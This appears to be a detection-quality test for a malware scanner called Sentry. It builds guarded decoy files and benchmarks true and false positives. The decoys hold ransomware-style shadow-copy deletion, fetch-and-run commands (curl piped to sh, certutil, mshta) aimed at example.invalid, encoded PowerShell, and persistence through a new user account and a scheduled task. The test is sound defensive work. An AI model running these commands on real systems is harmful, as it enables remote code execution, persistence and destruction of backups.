"""Detection-quality regression gate for Sentry.

Measures two things and fails if either regresses:

  1. TRUE-POSITIVE RATE on a set of ~20 harmless-but-structurally-suspicious
     files generated fresh into a temp directory (no malware, no network).
  2. FALSE-POSITIVE RATE on a benign corpus sampled from whatever real system
     files exist on this machine (system binaries, installed Python packages,
     shell scripts, node modules, docs).  If no corpus path exists the benign
     half is skipped with a clear message instead of failing.

Run:  python3 test_detection_quality.py
Exit: 0 when TP rate >= MIN_TP_RATE and benign FP rate <= MAX_FP_RATE.
"""
from __future__ import annotations

import os
import re
import shutil
import struct
import sys
import tempfile
from collections import Counter
from pathlib import Path

# This file lives in tests/, so the importable project root is two up.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from sentry import config, engine  # noqa: E402

# ---------------------------------------------------------------- gate levels
# Achieved on 2026-08-19 after false-positive tuning:
#   true positives 25/25 detected, benign false positives 0 out of 59,289 real
#   files (4.8 GB), including 426 genuine Windows PE files unpacked from PyPI
#   win_amd64 wheels.  Highest score reached by any clean file was 18.
# The FP gate is therefore zero-tolerance: the tuned scanner produced no
# false positive at all, so any single new one is a regression worth failing on.
MIN_TP_RATE = 1.00          # every decoy category must still be caught
MAX_FP_RATE = 0.0           # percent, over the sampled benign corpus
BENIGN_SAMPLE_CAP = 8000    # keep the gate fast enough to run routinely
THRESHOLD = 25

CFG = dict(config.DEFAULTS)
CFG["use_hash_feed"] = False
CFG["use_yara"] = False
CFG["exclusions"] = []
CFG["report_threshold"] = THRESHOLD


# ------------------------------------------------------------- PE synthesis
# A structurally parseable PE32+ image so that the PE heuristics (sections,
# entropy, entry point, packer names) have something real to chew on.  It
# contains no code that does anything: section bodies are data.

def build_pe(sections, *, entry_rva=None, dll=False, timestamp=0x5F000000,
             machine=0x8664) -> bytes:
    """sections: list of (name, body_bytes, characteristics, raw_size_override)."""
    n = len(sections)
    hdr_size = 0x40 + 0x40 + 4 + 20 + 240 + 40 * n
    file_align, sect_align = 0x200, 0x1000
    size_of_headers = (hdr_size + file_align - 1) // file_align * file_align

    laid = []
    rva = sect_align
    off = size_of_headers
    for name, body, chars, raw_override in sections:
        raw = len(body) if raw_override is None else raw_override
        raw_aligned = (raw + file_align - 1) // file_align * file_align
        laid.append({"name": name, "body": body, "chars": chars,
                     "vsize": max(len(body), 0x1000), "rva": rva,
                     "raw": raw, "off": off if raw else 0})
        rva += (max(len(body), 0x1000) + sect_align - 1) // sect_align * sect_align
        off += raw_aligned
    size_of_image = rva

    if entry_rva is None:
        entry_rva = laid[0]["rva"]

    dos = bytearray(0x40)
    dos[0:2] = b"MZ"
    struct.pack_into("<H", dos, 0x02, 0x90)
    struct.pack_into("<H", dos, 0x04, 3)
    struct.pack_into("<I", dos, 0x3C, 0x40 + 0x40)
    stub = (b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd!\xb8\x01L\xcd!"
            b"This program cannot be run in DOS mode.\r\r\n$").ljust(0x40, b"\x00")

    fh = struct.pack("<HHIIIHH", machine, n, timestamp, 0, 0, 240,
                     0x2022 if dll else 0x0022)

    oh = struct.pack(
        "<HBBIIIIIIQIIHHHHHHIIIIHHQQQQII",
        0x20B, 14, 0, 0x1000, 0x1000, 0, entry_rva, laid[0]["rva"], 0,
        0x180000000, sect_align, file_align, 6, 0, 0, 0, 6, 0, 0,
        size_of_image, size_of_headers, 0, 3, 0x160,
        0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    oh += b"\x00" * 128  # 16 empty data directories

    sect_hdrs = b""
    for s in laid:
        sect_hdrs += struct.pack(
            "<8sIIIIIIHHI", s["name"].encode()[:8], s["vsize"], s["rva"],
            s["raw"], s["off"], 0, 0, 0, 0, s["chars"])

    head = bytes(dos) + stub + b"PE\x00\x00" + fh + oh + sect_hdrs
    head = head.ljust(size_of_headers, b"\x00")
    body = b""
    for s in laid:
        if s["raw"]:
            b_ = s["body"][:s["raw"]].ljust(s["raw"], b"\x00")
            body += b_.ljust((s["raw"] + file_align - 1) // file_align * file_align,
                             b"\x00")
    return head + body


RX = 0x60000020            # read + execute + code
RW = 0xC0000040            # read + write + initialised data
WX = 0xE0000020            # read + write + execute  (suspicious)
RO = 0x40000040            # read only + initialised data


def _pseudo_random(nbytes: int, seed: int = 1) -> bytes:
    """Deterministic high-entropy filler (no os.urandom, so runs reproduce)."""
    out = bytearray()
    x = seed | 1
    while len(out) < nbytes:
        x = (x * 6364136223846793005 + 1442695040888963407) & ((1 << 64) - 1)
        out += struct.pack("<Q", x)
    return bytes(out[:nbytes])


TEXT_BODY = (b"\x48\x89\x5c\x24\x08\x48\x83\xec\x20" * 700).ljust(0x2000, b"\x90")

PS_ENCODED = (
    "# harmless decoy - executes nothing, the strings only LOOK like a dropper\n"
    "if ($false) {\n"
    "  powershell -nop -w hidden -enc "
    + "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA" * 4 + "==\n"
    "  IEX ([System.Text.Encoding]::UTF8.GetString("
    "[System.Convert]::FromBase64String(\"Zm9vYmFy\")))\n"
    "}\n")


def build_true_positives(root: Path) -> dict[str, Path]:
    """~20 harmless files, one per detection category."""
    root.mkdir(parents=True, exist_ok=True)
    f: dict[str, Path] = {}
    plain_pe = build_pe([(".text", TEXT_BODY, RX, None),
                         (".rdata", b"harmless decoy data" * 400, RO, None)])

    def w(key, name, data, *, text=False):
        p = root / name
        p.parent.mkdir(parents=True, exist_ok=True)
        if text:
            p.write_text(data, encoding="utf-8")
        else:
            p.write_bytes(data)
        f[key] = p
        return p

    # --- filename tricks
    w("double_ext", "invoice_2026.pdf.exe", plain_pe)
    w("rlo_name", "photo_2026\u202egnp.exe", plain_pe)
    w("whitespace_pad", "holiday.jpg" + " " * 12 + ".exe", plain_pe)
    w("random_name", "qk39fjs01xzmvb27.exe", plain_pe)
    w("media_folder_exe", "Pictures/vacation_viewer.exe", plain_pe)

    # --- content/extension mismatch
    w("pe_as_txt", "meeting_notes.txt", plain_pe)
    w("pe_no_ext", "svhost_update", plain_pe)

    # --- PE structure
    w("packer_sections", "setup_bundle.exe", build_pe([
        ("UPX0", b"", RX, 0),
        ("UPX1", _pseudo_random(0x4000, 7), RX, None),
        (".rsrc", b"rsrc" * 256, RO, None)]))
    w("high_entropy_code", "codec_helper.dll", build_pe([
        (".text", _pseudo_random(0x6000, 11), RX, None),
        (".rdata", b"plain readable strings " * 300, RO, None)], dll=True))
    w("wx_section", "render_engine.dll", build_pe([
        (".text", TEXT_BODY, RX, None),
        (".data", b"mutable" * 900, WX, None)], dll=True))
    w("unpack_stub", "installer_core.exe", build_pe([
        (".text", TEXT_BODY, RX, None),
        (".stub", b"", WX, 0)]))
    w("ep_last_section", "patcher.exe", build_pe(
        [(".text", TEXT_BODY, RX, None),
         (".rdata", b"data" * 900, RO, None),
         (".xtra", _pseudo_random(0x3000, 13), RX, None)],
        entry_rva=0x1000 + 0x2000 + 0x1000))
    w("ep_outside", "loader.exe", build_pe(
        [(".text", TEXT_BODY, RX, None)], entry_rva=0x900000))

    # --- scripts
    w("ps_encoded", "update_helper.ps1", PS_ENCODED, text=True)
    w("ps_defender", "optimize_pc.ps1",
      "# decoy\nif ($false) { Add-MpPreference -ExclusionPath \"C:\\Temp\" }\n",
      text=True)
    w("ransomware_shape", "restore_backup.cmd",
      "@echo off\nrem decoy - guarded so it cannot run\nif 1==2 (\n"
      "  vssadmin delete shadows /all /quiet\n  bcdedit /set recoveryenabled no\n)\n",
      text=True)
    w("lolbin_certutil", "fix_printer.bat",
      "@echo off\nrem decoy\nif 1==2 certutil -urlcache -split -f "
      "http://example.invalid/a.txt b.txt\n", text=True)
    w("lolbin_mshta", "invite.hta",
      "<!-- decoy, never opened -->\n<html><body>\n"
      "<!-- mshta http://example.invalid/x.hta -->\n</body></html>\n", text=True)
    w("lolbin_rundll32", "shortcut_fix.cmd",
      "@echo off\nrem decoy\nif 1==2 rundll32 javascript:\"..\\mshtml\"\n",
      text=True)
    w("persistence_account", "onboard_user.cmd",
      "@echo off\nrem decoy\nif 1==2 (\n  net user helper Pa55w0rd /add\n"
      "  schtasks /create /tn Helper /tr helper.exe /sc onlogon\n)\n", text=True)
    w("js_nested_eval", "banner.js",
      "// decoy - the call is unreachable\nvar p = '"
      + "cmV0dXJuIDE7Y29uc29sZS5sb2coJ2hlbGxvJyk7" * 8
      + "';\nfunction never(){ return eval(atob(p)); }\n", text=True)
    w("vbs_charcode", "mailer.vbs",
      "' decoy\nIf False Then\n  s = Chr(104) & Chr(116) & Chr(116) & Chr(112)\n"
      "  Set o = CreateObject(\"WScript.Shell\")\n  o.Run \"calc\"\nEnd If\n",
      text=True)
    w("shell_pipe", "bootstrap.sh",
      "#!/bin/sh\n# decoy, guarded\nif false; then\n"
      "  curl -fsSL http://example.invalid/i.sh | sh\nfi\n", text=True)

    # --- Office macro markers (an OOXML-shaped zip carrying VBA markers)
    import zipfile
    p = root / "quarterly_report.docm"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/vbaProject.bin",
                   "Attribute VB_Name\nSub AutoOpen()\n"
                   "  Shell(\"powershell -w hidden\")\n"
                   "  CreateObject(\"WScript.Shell\")\nEnd Sub\n")
    f["office_macro"] = p

    w("xls_macro_markers", "budget.xls",
      b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64
      + b"Attribute VB_Name\x00Sub Workbook_Open()\x00Shell(\"cmd\")\x00"
      + b"CreateObject\x00urlmon\x00" + b"\x00" * 2048)

    return f


# ------------------------------------------------------------ benign corpus
BENIGN_ROOTS = [
    "/usr/bin", "/bin", "/usr/sbin", "/usr/lib/x86_64-linux-gnu",
    "/usr/lib/python3", "/usr/lib/python3.10", "/usr/lib/python3.11",
    "/usr/lib/python3.12", "/usr/lib/python3.13",
    "/usr/local/lib/python3.11/dist-packages",
    "/usr/local/lib/python3.12/dist-packages",
    "/etc", "/usr/share/doc", "/usr/share/fonts", "/opt/node22",
    # Optional: unpacked Windows wheels, if a previous measurement run left them.
    "/tmp/corpus/winpe",
]


def collect_benign(cap: int) -> list[str]:
    """Deterministic, evenly-spread sample of the real files under BENIGN_ROOTS.

    Every root is walked in full and then stride-sampled, so the sample stays
    representative of the whole tree (in particular it keeps the Windows PE
    files, which are the only ones the PE heuristics can fire on) instead of
    just the alphabetically-first corner of one subdirectory.
    """
    roots = [r for r in BENIGN_ROOTS if os.path.isdir(r)]
    if not roots:
        return []
    per_root = max(1, cap // len(roots))
    out: list[str] = []
    for r in roots:
        allf: list[str] = []
        for dirpath, dirnames, filenames in os.walk(r, onerror=lambda e: None):
            dirnames[:] = sorted(d for d in dirnames if d != "__pycache__")
            for fn in sorted(filenames):
                p = os.path.join(dirpath, fn)
                if os.path.islink(p) or not os.path.isfile(p):
                    continue
                allf.append(p)
            if len(allf) > 120_000:      # safety bound on pathological trees
                break
        if len(allf) <= per_root:
            out.extend(allf)
        else:
            step = len(allf) / per_root
            out.extend(allf[int(i * step)] for i in range(per_root))
    return sorted(set(out))


def canon(reason: str) -> str:
    r = re.sub(r"\[.*?\]", "", reason)
    r = r.split(":")[0]
    return re.sub(r"\(.*?\)", "()", r).strip()


def scan(paths):
    hits = []
    nbytes = 0
    for p in paths:
        try:
            nbytes += os.path.getsize(p)
            fnd = engine.scan_file(p, known_bad={}, yara_rules=None, cfg=CFG,
                                   allow=set())
        except Exception:
            continue
        if fnd:
            hits.append((p, fnd["score"], fnd["severity"], fnd["reasons"]))
    return hits, nbytes


def main() -> int:
    failures: list[str] = []

    print("\n=== TRUE POSITIVES (harmless structural decoys) ===")
    tmp = Path(tempfile.mkdtemp(prefix="sentry_tp_"))
    try:
        tp = build_true_positives(tmp / "decoys")
        hits, _ = scan([str(p) for p in tp.values()])
        flagged = {h[0] for h in hits}
        by_path = {h[0]: h for h in hits}
        detected = 0
        for key, path in sorted(tp.items()):
            h = by_path.get(str(path))
            if h:
                detected += 1
                print(f"  DETECT  {h[1]:>3} {h[2]:<6} {key}")
            else:
                print(f"  MISS      -        {key}   ({path.name})")
        rate = detected / max(len(tp), 1)
        print(f"\n  detection rate: {detected}/{len(tp)} = {100*rate:.1f}% "
              f"(gate >= {100*MIN_TP_RATE:.1f}%)")
        if rate < MIN_TP_RATE - 1e-9:
            failures.append(f"true-positive rate {100*rate:.1f}% below gate "
                            f"{100*MIN_TP_RATE:.1f}%")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    print("\n=== FALSE POSITIVES (real files on this machine) ===")
    benign = collect_benign(BENIGN_SAMPLE_CAP)
    if not benign:
        print("  SKIP: none of the benign corpus roots exist on this machine, so "
              "the false-positive half cannot be measured here.")
        print("  Roots looked for: " + ", ".join(BENIGN_ROOTS))
    else:
        hits, nbytes = scan(benign)
        fp_rate = 100.0 * len(hits) / len(benign)
        print(f"  scanned {len(benign):,} files ({nbytes/1e6:,.0f} MB) from "
              f"{len({p.split(os.sep)[2] if p.count(os.sep)>2 else p for p in benign})}"
              f" areas")
        print(f"  flagged at threshold {THRESHOLD}: {len(hits)}")
        print(f"  FP rate: {fp_rate:.3f}%  (gate <= {MAX_FP_RATE:.3f}%)")
        if hits:
            c = Counter()
            for _p, _s, _sev, reasons in hits:
                for r in reasons:
                    c[canon(r)] += 1
            print("  noisiest reasons:")
            for k, v in c.most_common(10):
                print(f"    {v:5d}  {k}")
            print("  worst offenders:")
            for p, s, sev, _r in sorted(hits, key=lambda h: -h[1])[:10]:
                print(f"    {s:>3} {sev:<6} {p}")
        if fp_rate > MAX_FP_RATE + 1e-9:
            failures.append(f"benign FP rate {fp_rate:.3f}% above gate "
                            f"{MAX_FP_RATE:.3f}%")

    print("\n" + "-" * 60)
    if failures:
        for msg in failures:
            print(f"  FAIL: {msg}")
        print()
        return 1
    print("  PASS: detection quality is at or above the recorded baseline.\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
